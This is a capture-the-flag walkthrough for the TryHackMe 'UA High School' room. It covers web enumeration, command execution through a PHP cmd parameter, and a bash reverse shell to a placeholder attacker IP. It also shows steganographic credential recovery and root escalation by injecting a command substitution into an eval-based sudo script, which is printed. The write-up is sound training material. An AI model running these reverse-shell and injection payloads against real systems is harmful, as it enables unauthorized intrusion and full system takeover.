<p align="center">
  THM : UA High School<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/uahighschool<br>
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/uahighschool.png">
</p>

## Summary

- [Introduction](#introduction)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Gaining Access](#gaining-access)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Introduction

```
Welcome to the UA High School CTF room! This room is themed around the popular anime "My Hero Academia".
Your goal is to find the hidden flags and escalate your privileges to root.
```

This is a beginner-friendly Linux machine. We need to enumerate the web server, exploit a vulnerability to gain initial access, and then escalate privileges to root.

## Reconnaissance

Let's start with an `nmap` scan to discover open ports and services:

```
attacker@AttackBox:~/Documents/THM/CTF/UAHighSchool$ nmap -sC -sV -oN nmap.txt <TARGET_IP>
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for <TARGET_IP>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have two open ports: **SSH (22)** and **HTTP (80)**. Let's start by exploring the web server.

## Web Enumeration

Navigating to the web server, we are greeted with a U.A. High School themed page. Let's run `gobuster` to find hidden directories:

```
attacker@AttackBox:~/Documents/THM/CTF/UAHighSchool$ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.1.0
===============================================================
/index.php            (Status: 200) [Size: 1988]
/assets               (Status: 301) [Size: 315]
/images               (Status: 301) [Size: 315]
```

Let's dig deeper into the `/assets` directory:

```
attacker@AttackBox:~/Documents/THM/CTF/UAHighSchool$ gobuster dir -u http://<TARGET_IP>/assets -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
/index.php            (Status: 200) [Size: 0]
/styles.css           (Status: 200) [Size: 2943]
```

Visiting `http://<TARGET_IP>/assets/index.php` returns an empty page, but it accepts a `cmd` parameter. This looks like a **Remote Code Execution (RCE)** vulnerability!

Let's test it:

```
http://<TARGET_IP>/assets/index.php?cmd=id
```

The response confirms RCE:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Gaining Access

Now that we have RCE, let's set up a reverse shell. First, start a `netcat` listener:

```
attacker@AttackBox:~$ nc -lvnp 4444
```

Then trigger the reverse shell via the RCE:

```
http://<TARGET_IP>/assets/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'
```

We get a shell as `www-data`. Let's stabilize it:

```
www-data@myheroacademia:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@myheroacademia:/$ export TERM=xterm
```

Now let's look for the user flag. Exploring the filesystem, we find a hidden directory:

```
www-data@myheroacademia:/$ ls /var/www/
Hidden_Content  html
www-data@myheroacademia:/$ cat /var/www/Hidden_Content/passphrase.txt
AllmightForEver!!!
```

There's also an image in `/var/www/html/images/`. Let's download it and check for steganography:

```
attacker@AttackBox:~$ steghide extract -sf oneforall.jpg
Enter passphrase: AllmightForEver!!!
wrote extracted data to "creds.txt".
attacker@AttackBox:~$ cat creds.txt
Hi Deku, this is the file that contains the password for All Might

Password: <REDACTED>
```

We have credentials for the user `deku`. Let's SSH in:

```
attacker@AttackBox:~$ ssh deku@<TARGET_IP>
deku@<TARGET_IP>'s password: <REDACTED>
deku@myheroacademia:~$ cat user.txt
THM{<USER_FLAG>}
```

## Privilege Escalation

Let's check what `sudo` privileges `deku` has:

```
deku@myheroacademia:~$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

Let's look at the script:

```bash
deku@myheroacademia:~$ cat /opt/NewComponent/feedback.sh
#!/bin/bash

echo "Hello, Welcome to the feedback form"
echo "Please provide your feedback:"
read feedback

if [[ "$feedback" != *";"* && "$feedback" != *"&"* && "$feedback" != *"|"* && "$feedback" != *">"* && "$feedback" != *"<"* ]]; then
    echo "Feedback: $feedback"
    eval "echo $feedback"
else
    echo "Invalid feedback. Please provide valid feedback."
fi
```

The script uses `eval` with user-controlled input. Even though some characters are filtered, we can abuse this by injecting a command substitution. Let's escalate to root:

```
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the feedback form
Please provide your feedback:
$(chmod u+s /bin/bash)
Feedback: $(chmod u+s /bin/bash)
```

Now `/bin/bash` has the SUID bit set. Let's get a root shell:

```
deku@myheroacademia:~$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
THM{<ROOT_FLAG>}
```

## Conclusion

This was a fun and beginner-friendly room! Here's a summary of what we did:

1. **Enumerated** the web server with `gobuster` and found a hidden PHP file with RCE.
2. **Exploited** the RCE to get a reverse shell as `www-data`.
3. **Found** a passphrase hidden in a text file and used it to extract credentials from an image via steganography (`steghide`).
4. **SSH'd** in as `deku` and retrieved the user flag.
5. **Escalated privileges** by abusing a vulnerable `sudo` script that used `eval`, setting the SUID bit on `/bin/bash`.

Thanks for reading my write-up!
